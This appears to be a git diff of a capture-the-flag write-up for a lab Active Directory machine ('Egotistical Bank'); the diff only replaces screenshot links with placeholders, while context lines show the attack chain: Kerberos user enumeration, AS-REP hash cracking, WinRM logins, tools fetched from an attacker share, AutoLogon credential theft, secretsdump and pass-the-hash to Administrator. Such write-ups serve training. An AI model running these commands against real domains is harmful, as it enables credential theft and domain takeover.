@@ -17,9 +17,9 @@ export target=10.129.23.17
 sudo nmap -p- --min-rate 1000 -sT -vvv $target
 ```
 
-<img width="457" height="74" alt="image" src="https://github.com/user-attachments/assets/8617b1fb-cce7-4ee1-9458-45ee2ac2a532" />
+<img width="457" height="74" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="512" height="502" alt="image" src="https://github.com/user-attachments/assets/c9a23630-58a1-485c-b0d8-9f20cb28fb2b" />
+<img width="512" height="502" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Open Ports Discovered**:
 ```
@@ -48,7 +48,7 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 sudo nmap -sC -sV -p 53,80,88,135,139,389,445,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49698 -T4 $target
 ```
 
-<img width="957" height="852" alt="image" src="https://github.com/user-attachments/assets/90a42bfc-03b3-4ca5-b155-cf628fdf47d6" />
+<img width="957" height="852" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Key Services Identified**:
 - **Domain Controller**: Active Directory Environment
@@ -65,12 +65,12 @@ sudo nmap -sC -sV -p 53,80,88,135,139,389,445,593,636,3268,3269,5985,9389,49668,
 Visiting `http://10.129.23.17` revealed:
 - Corporate website for "Egotistical Bank"
 
-<img width="962" height="976" alt="image" src="https://github.com/user-attachments/assets/19fc477f-4240-4018-8d9b-88a407797007" />
+<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 - Potential usernames from employee mentions
 - Domain: `EGOTISTICAL-BANK.LOCAL`
 
-<img width="962" height="976" alt="image" src="https://github.com/user-attachments/assets/9a435c60-294a-4286-a550-12fea98fa489" />
+<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 
 ### SMB Enumeration
@@ -80,11 +80,11 @@ smbclient -N -L //10.129.23.17/
 - Anonymous access attempted
 - No accessible shares found
 
-<img width="721" height="171" alt="image" src="https://github.com/user-attachments/assets/6ba45b38-0dd0-42fb-b7ab-39e9851595a1" />
+<img width="721" height="171" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### RPC Enumeration
 
-<img width="442" height="197" alt="image" src="https://github.com/user-attachments/assets/b5b6bf33-b8bc-4c1d-8b4b-c25122e3b9f2" />
+<img width="442" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 ### LDAP Reconnaissance
 ```bash
@@ -94,7 +94,7 @@ ldapsearch -x -H ldap://10.129.23.17 -D 'CN=Configuration,DC=EGOTISTICAL-BANK,DC
 - Initial LDAP queries unsuccessful
 - Required authenticated access
 
-<img width="748" height="819" alt="image" src="https://github.com/user-attachments/assets/09da19d4-d0d0-4c2b-b53a-98d50daf6618" />
+<img width="748" height="819" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 
 ---
@@ -104,7 +104,7 @@ ldapsearch -x -H ldap://10.129.23.17 -D 'CN=Configuration,DC=EGOTISTICAL-BANK,DC
 ### Username Discovery
 From website analysis, compiled potential usernames:
 
-<img width="962" height="976" alt="image" src="https://github.com/user-attachments/assets/c48206bc-6c47-4a9d-8866-5ebd249e58cb" />
+<img width="962" height="976" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 ```
 fsmith
@@ -119,14 +119,14 @@ scoins
 ```
 
 
-<img width="951" height="368" alt="image" src="https://github.com/user-attachments/assets/fe9b38f3-c584-429c-9025-d24e0f4c8e2c" />
+<img width="951" height="368" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ### Kerbrute User Enumeration
 ```bash
 ./kerbrute_linux_amd64 userenum --dc 10.129.23.17 -d 'EGOTISTICAL-BANK.LOCAL' ./user.txt -t 100
 ```
 
-<img width="953" height="370" alt="image" src="https://github.com/user-attachments/assets/b4d49489-1ee3-4bf1-834b-6776e78203ec" />
+<img width="953" height="370" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Valid Users Identified**:
 - ✅ `administrator@EGOTISTICAL-BANK.LOCAL`
@@ -141,7 +141,7 @@ for i in $(cat user.txt); do
 done
 ```
 
-<img width="952" height="641" alt="image" src="https://github.com/user-attachments/assets/33fbb8b2-ca99-48c9-98b4-7dab83af01d2" />
+<img width="952" height="641" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 **Hash Captured**:
 ```
@@ -166,7 +166,7 @@ hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
 evil-winrm -i 10.129.23.17 -u fsmith -p 'Thestrokes23'
 ```
 
-<img width="580" height="845" alt="image" src="https://github.com/user-attachments/assets/f3b2ddc6-d680-4749-a599-97f7dbd13ee2" />
+<img width="580" height="845" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **User Flag Captured**:
 ```
@@ -181,7 +181,7 @@ copy \\10.10.14.90\share\winpeas.exe .
 .\winpeas.exe -cmd fast
 ```
 
-<img width="663" height="281" alt="image" src="https://github.com/user-attachments/assets/c34f5c9b-1f02-4631-ba3e-3bab998d6b5f" />
+<img width="663" height="281" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Critical Finding - AutoLogon Credentials**:
 ```
@@ -190,7 +190,7 @@ DefaultUserName: EGOTISTICALBANK\svc_loanmanager
 DefaultPassword: Moneymakestheworldgoround!
 ```
 
-<img width="568" height="115" alt="image" src="https://github.com/user-attachments/assets/c7460433-c409-4631-a780-701717d6e54e" />
+<img width="568" height="115" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 ---
 
@@ -201,7 +201,7 @@ DefaultPassword: Moneymakestheworldgoround!
 evil-winrm -i 10.129.23.17 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
-<img width="651" height="315" alt="image" src="https://github.com/user-attachments/assets/bd687cce-5e00-4592-9824-55f84ee5446f" />
+<img width="651" height="315" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 ### BloodHound Enumeration
 Transferred SharpHound collector and extracted domain data:
@@ -223,7 +223,7 @@ copy \\10.10.14.90\share\SharpHound.exe .
 impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.129.23.17'
 ```
 
-<img width="950" height="644" alt="image" src="https://github.com/user-attachments/assets/4d7068f0-ed2a-4408-a4ce-dd1242500a9c" />
+<img width="950" height="644" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 **Administrator Hash Extracted**:
 ```
@@ -235,7 +235,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f
 evil-winrm -i 10.129.23.17 -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
 ```
 
-<img width="951" height="579" alt="image" src="https://github.com/user-attachments/assets/74efc4f4-ff03-4fd8-8e9c-eeca5d3f03ef" />
+<img width="951" height="579" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 ---
 
